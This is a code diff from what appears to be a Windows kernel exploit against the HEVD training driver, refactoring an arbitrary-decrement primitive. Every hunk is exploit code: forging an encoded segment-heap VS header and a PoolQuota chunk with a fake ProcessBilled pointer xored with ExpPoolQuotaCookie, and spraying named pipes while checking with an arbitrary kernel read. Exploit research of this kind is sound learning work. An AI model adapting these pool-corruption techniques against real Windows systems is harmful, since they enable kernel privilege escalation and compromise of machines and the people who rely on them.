@@ -5,7 +5,6 @@
 
 #include "primitives/arbitrary_decrement.h"
 
-#include "primitives/fake_chunk.h"
 #include "primitives/arbitrary_read.h"
 #include "pipe_utils/pipe_utils.h"
 #include "hevd/hevd.h"
@@ -109,33 +108,30 @@ int ArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintp
     new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ ghost_chunk_vs_header ^ addrs->RtlpHpHeapGlobals;
     new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ ghost_chunk_vs_header ^ addrs->RtlpHpHeapGlobals;
 
-    pipe_queue_entry_t overwritten_pipe_entry;
-    overwritten_pipe_entry.list.Flink = (LIST_ENTRY*)addrs->leak_root_queue;
-    overwritten_pipe_entry.list.Blink = (LIST_ENTRY*)addrs->leak_root_queue;
-    overwritten_pipe_entry.linkedIRP = 0;
-    overwritten_pipe_entry.SecurityClientContext = 0;
-    overwritten_pipe_entry.isDataInKernel = 0;
-    overwritten_pipe_entry.DataSize = 0;
-    overwritten_pipe_entry.remaining_bytes = 0;
-    overwritten_pipe_entry.field_2C = 0x43434343;
-
-    char* fake_pool_quota_chunk_buf = CreateFakeChunk(
-        new_encoded_vs_header,
-        0,                                                                                              // Previous size
-        0,                                                                                              // Pool index
-        0x100 / 0x10,                                                                                   // Block size (0x100 bytes)
-        8,                                                                                              // Pool type (PoolQuota)
-        0x42424242,                                                                                     // Pool Tag
-        (addrs->fake_eprocess + FAKE_EPROCESS_OFFSET) ^ addrs->ExpPoolQuotaCookie ^ addrs->ghost_chunk, // ProcessBilled
-        &overwritten_pipe_entry                                                                         // PipeQueueEntry
-    );
+    vs_chunk_t fake_pool_quota_chunk = { 0 };
+    fake_pool_quota_chunk.encoded_vs_header[0] = new_encoded_vs_header[0];
+    fake_pool_quota_chunk.encoded_vs_header[1] = new_encoded_vs_header[1];
+    fake_pool_quota_chunk.previous_size = 0;
+    fake_pool_quota_chunk.pool_index = 0;
+    fake_pool_quota_chunk.block_size = 0x100 / 0x10;
+    fake_pool_quota_chunk.pool_type = 8;
+    fake_pool_quota_chunk.pool_tag = 0x42424242;
+    fake_pool_quota_chunk.process_billed = (addrs->fake_eprocess + FAKE_EPROCESS_OFFSET) ^ addrs->ExpPoolQuotaCookie ^ addrs->ghost_chunk;
+    fake_pool_quota_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->leak_root_queue;
+    fake_pool_quota_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->leak_root_queue;
+    fake_pool_quota_chunk.pipe_queue_entry.linkedIRP = 0;
+    fake_pool_quota_chunk.pipe_queue_entry.SecurityClientContext = 0;
+    fake_pool_quota_chunk.pipe_queue_entry.isDataInKernel = 0;
+    fake_pool_quota_chunk.pipe_queue_entry.DataSize = 0;
+    fake_pool_quota_chunk.pipe_queue_entry.remaining_bytes = 0;
+    fake_pool_quota_chunk.pipe_queue_entry.field_2C = 0x43434343;
 
     puts("[*] Spraying pipes with fake ProcessBilled...");
     uintptr_t pipe_queue_entry_addr = NULL;
     do
     {
         FreeNPPNxChunk(pipes->previous_pipe, TARGETED_VULN_SIZE - 0x40);
-        AllocNPPNxChunk(pipes->previous_pipe, fake_pool_quota_chunk_buf, TARGETED_VULN_SIZE - 0x40);
+        AllocNPPNxChunk(pipes->previous_pipe, &fake_pool_quota_chunk, TARGETED_VULN_SIZE - 0x40);
         ArbitraryRead(pipes->ghost_pipe, addrs->leak_root_queue, (char*)&pipe_queue_entry_addr, 0x8);
     } while (pipe_queue_entry_addr == addrs->ghost_chunk + POOL_HEADER_SIZE);
 
